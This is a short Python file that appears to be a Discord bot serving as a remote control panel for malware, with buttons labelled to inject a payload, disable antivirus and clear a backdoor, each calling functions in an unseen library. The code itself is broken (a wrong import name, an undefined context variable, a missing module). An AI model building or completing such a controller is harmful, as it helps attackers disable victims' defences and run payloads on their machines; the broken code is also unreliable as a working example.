import discord
from discord.ext import commands
from discord.ui import Button, View
import library.py

TOKEN = "YOUR_BOT_TOKEN"

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

class MyView(View):
    def __init__(self):
        super().__init__()

        button1 = Button(label="Inject Pawn", style=discord.ButtonStyle.primary, custom_id="btn_1")
        button2 = Button(label="Disabe AV", style=discord.ButtonStyle.primary, custom_id="btn_2")
        button3 = Button(label="Clear Backdoor", style=discord.ButtonStyle.primary, custom_id="btn_3")

        button1.callback = self.button1_callback
        button2.callback = self.button2_callback
        button3.callback = self.button3_callback

        self.add_item(button1)
        self.add_item(button2)
        self.add_item(button3)

    async def button1_callback(self, interaction: discord.Interaction):
        await interaction.response.send_message("Injecting...", ephemeral=True)
        lib.injectPawn()

    async def button2_callback(self, interaction: discord.Interaction):
        await interaction.response.send_message("Disabling AV...", ephemeral=True)
        lib.disableAv()

    async def button3_callback(self, interaction: discord.Interaction):
        await interaction.response.send_message("Clearing Diamond...", ephemeral=True)
        lib.Clear()

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    await ctx.send(f"Logged in as {bot.user}")
    time.sleep(3)

@bot.command()
async def send(ctx):
    view = MyView()
    await ctx.send("Diamond Options:", view=view)

bot.run(TOKEN)
